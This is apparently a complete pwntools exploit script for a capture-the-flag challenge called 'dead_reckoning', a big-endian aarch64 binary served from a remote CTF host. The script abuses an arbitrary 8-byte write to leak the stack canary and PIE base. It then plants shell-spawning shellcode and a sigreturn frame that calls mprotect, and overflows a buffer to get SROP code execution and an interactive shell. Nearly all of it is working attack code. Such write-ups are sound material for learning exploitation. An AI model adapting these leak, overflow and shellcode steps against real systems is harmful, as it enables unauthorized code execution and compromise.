#!/usr/bin/env python3

from pwn import *

exe = ELF("./dead_reckoning")

context.arch = "aarch64"
context.endian = "big"


def conn():
    global r

    if args.LOCAL:
        r = process([
            "qemu-aarch64_be-static",
            # "-g", "1234",
            "./dead_reckoning.debug",
        ])
    else:
        r = remote("dead-reckoning-6585d1050213.chals.z0d1ak.org", 1337, ssl=True)

    return r


def repair(addr: int, value: int):
    r.sendlineafter(b"> ", b"1")
    r.sendlineafter(b"destination: ", hex(addr).encode())
    r.sendlineafter(b"eight-byte patch: ", hex(value).encode())


def survey_wreck():
    r.sendlineafter(b"> ", b"2")
    r.recvuntil(b"survey: ")
    return r.recvline().strip()


def import_route(data: bytes):
    r.sendlineafter(b"> ", b"3")
    r.sendlineafter(b"route length: ", hex(len(data)).encode())
    r.sendafter(b"route bytes: ", data)


def write_blob(addr: int, data: bytes):
    # The challenge's primitive only writes 8 bytes at a time
    data = data.ljust((len(data) + 7) & ~7, b"\x00")

    for off in range(0, len(data), 8):
        value = int.from_bytes(data[off:off + 8], "big")
        repair(addr + off, value)


def main():
    r = conn()

    r.recvuntil(b"salvage arena : ")
    arena = int(r.recvline().strip(), 16)
    log.info(f"arena: {arena:#x}")

    # Tag pointer for the win; change print size
    repair((arena + 0x18d0) | (0x01 << 56), 0xd0)

    # Leak canary and PIE
    leak = survey_wreck()
    canary = int(leak[-32:-16], 16)
    exe.address = int(leak[-16:], 16) - 0x2e0
    log.info(f"canary: {canary:#x}")
    log.info(f"pie: {exe.address:#x}")

    # For REMOTE: spawning a shell doesn't work; maybe remote doesn't permit to spawn a shell
    # sc = asm(shellcraft.aarch64.linux.cat(b"/run/flag") + shellcraft.aarch64.linux.exit(0))

    sc = asm(shellcraft.aarch64.linux.sh())
    shellcode = arena + 0x800   # Avoid allocating over the frame's fpsimd_context reserved region
    write_blob(shellcode, sc)

    # svc #0; ret;
    syscall_ret = exe.address + 0x824

    frame = SigreturnFrame()
    frame.x0 = arena
    frame.x1 = 0x2000
    frame.x2 = 7
    frame.x8 = 0xe2
    frame.pc = syscall_ret
    frame.sp = arena + 0x1000
    frame.x30 = shellcode

    # context.endian breaks pwntools' SigreturnFrame fpsimd magic field
    # Apparently SigreturnFrame packs the fpsimd_context header (magic:u32, size:u32)
    # as one 64-bit register value. That's correct for little-endian, but on a big-endian
    # it puts the bytes in the wrong order!
    frame['magic'] = (0x46508001 << 32) | 0x210

    write_blob(arena, bytes(frame))

    # Buffer overflow and SROP
    payload = b"A" * 0xc0 + p64(canary) + p64(0) + p64(exe.address + 0x7fc)
    import_route(payload)

    r.interactive("$ ")


if __name__ == "__main__":
    main()
